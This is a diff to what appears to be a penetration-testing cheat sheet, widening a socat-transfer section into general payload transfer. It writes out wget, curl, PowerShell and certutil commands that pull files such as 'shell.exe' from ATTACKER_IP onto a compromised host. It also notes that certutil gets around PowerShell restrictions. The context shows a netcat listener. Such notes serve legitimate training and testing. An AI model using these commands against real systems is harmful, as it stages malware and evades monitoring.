@@ -152,18 +152,37 @@ rlwrap nc -lvnp 4444
 
 Adds command history (up/down arrows) and basic tab completion. Combine with the Python stabilisation steps above.
 
-### Transferring socat to a target
+### Transferring files to the target
+
+Serve the file from your machine, then download it on the target. Works for socat, payloads, or any tool.
 
 ```bash
-# Attacker — serve socat binary
+# Attacker — serve files from current directory
 sudo python3 -m http.server 80
-
-# Target (Linux)
-wget http://ATTACKER_IP/socat -O /tmp/socat && chmod +x /tmp/socat
-
-# Target (Windows)
-Invoke-WebRequest -Uri http://ATTACKER_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe
 ```
+
+**Linux target:**
+
+```bash
+wget http://ATTACKER_IP/payload -O /tmp/payload && chmod +x /tmp/payload
+# or
+curl http://ATTACKER_IP/payload -o /tmp/payload
+```
+
+**Windows target:**
+
+```powershell
+# PowerShell — download to disk
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP/shell.exe','shell.exe')"
+
+# PowerShell — Invoke-WebRequest
+Invoke-WebRequest -Uri http://ATTACKER_IP/shell.exe -OutFile C:\Windows\Temp\shell.exe
+
+# certutil — works when PowerShell is restricted
+certutil -urlcache -split -f http://ATTACKER_IP/shell.exe shell.exe
+```
+
+`certutil` is a built-in Windows certificate utility — the download feature is a side effect, making it useful when PowerShell is blocked or monitored.
 
 ---
 
